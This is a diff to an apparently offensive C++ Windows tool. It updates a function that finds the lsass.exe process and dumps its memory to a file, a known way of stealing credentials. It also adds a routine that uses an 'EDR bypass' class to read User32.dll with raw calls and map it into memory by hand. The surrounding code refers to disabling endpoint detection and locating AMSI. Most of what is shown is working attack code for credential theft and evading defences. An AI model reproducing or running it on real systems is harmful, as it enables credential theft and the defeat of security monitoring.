@@ -52,17 +52,17 @@ void dump_lsass()
 	//wchar_t lsass_exe[] = { 'l','s','a','s','s','.','e','x','e', 0 };
 
 	// Open a handle to lsass.dmp - this is where the minidump file will be saved to
-	HANDLE outFile = CreateFile(lsass_file, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE outFile = CreateFileW(lsass_file, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	// Find lsass PID	
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	PROCESSENTRY32 processEntry = {};
+	PROCESSENTRY32W processEntry = {};
 	processEntry.dwSize = sizeof(PROCESSENTRY32);
 	LPCWSTR processName = L"";
 
-	if (Process32First(snapshot, &processEntry)) {
+	if (Process32FirstW(snapshot, &processEntry)) {
 		while (_wcsicmp(processName, lsass_exe) != 0) {
-			Process32Next(snapshot, &processEntry);
+			Process32NextW(snapshot, &processEntry);
 			processName = processEntry.szExeFile;
 			lsassPID = processEntry.th32ProcessID;
 		}
@@ -311,6 +311,93 @@ void disable_edr()
 
 }
 
+void memory_module()
+{
+	Bypass_EDR byp = Bypass_EDR();
+
+	/*
+	* Read User32.dll file
+	*/
+	HANDLE handle = byp.CreateFileW((LPWSTR)L"C:\\Windows\\System32\\User32.dll", FILE_GENERIC_READ, FILE_SHARE_READ, FILE_OPEN, NULL);
+
+	if (handle == NULL)
+	{
+		printf("Failed to open User32\n");
+		return;
+	}
+
+	printf("Successfully opened User32\n");
+
+	unsigned int user32_size = 0;
+	unsigned int user32_buffer_size = 1024 * 10;
+	char* user32_buffer = (char*)malloc(user32_buffer_size);
+
+	DWORD size_read;
+	while (true)
+	{
+		NTSTATUS hres = byp.ReadFile(handle, user32_buffer + user32_size, user32_buffer_size - user32_size, &size_read);
+
+		if (hres == STATUS_END_OF_FILE)
+		{
+			user32_size += size_read;
+			break;
+		}
+		else if (hres == STATUS_SUCCESS)
+		{
+			user32_size += size_read;
+
+			if (user32_size == user32_buffer_size)
+			{
+				// REALLOC
+				user32_buffer_size += 1024 * 10;
+				user32_buffer = (char*)realloc(user32_buffer, user32_buffer_size);
+			}
+		}
+		else
+		{
+			printf("Error: %d\n", hres);
+			return;
+		}
+	}
+
+	printf("Done reading user32.dll, size: %d\n", user32_size);
+
+	bool success = byp.load_dll("user32.dll", user32_buffer, user32_buffer_size);
+	if (success)
+	{
+		printf("Successfully loaded user32\n");
+	}
+	else
+	{
+		printf("Failed to load user32: %d\n", GetLastError());
+	}
+
+	typedef int(*_MessageBoxA)(
+		HWND    hWnd,
+		LPCTSTR lpText,
+		LPCTSTR lpCaption,
+		UINT    uType
+		);
+	void* func = byp.get_func("user32.dll", "MessageBoxA");
+	if (func == 0)
+	{
+		printf("Failed to get MessageBoxA\n");
+	}
+	else
+	{
+		printf("Successfully got MessageBoxA\n");
+
+		_MessageBoxA fMessageBoxA = (_MessageBoxA)func;
+
+		fMessageBoxA(
+			NULL,
+			"Resource not available\nDo you want to try again?",
+			"Account Details",
+			MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
+		);
+	}
+}
+
 int main()
 {
     std::cout << "Hello World!\n";
@@ -327,6 +414,9 @@ int main()
 	printf("Amsi DLL: %x\n", amsi_addr);
 
 	//dump_lsass();
+
+
+	memory_module();
 
 	printf("End DumpLSASS\n");
 }
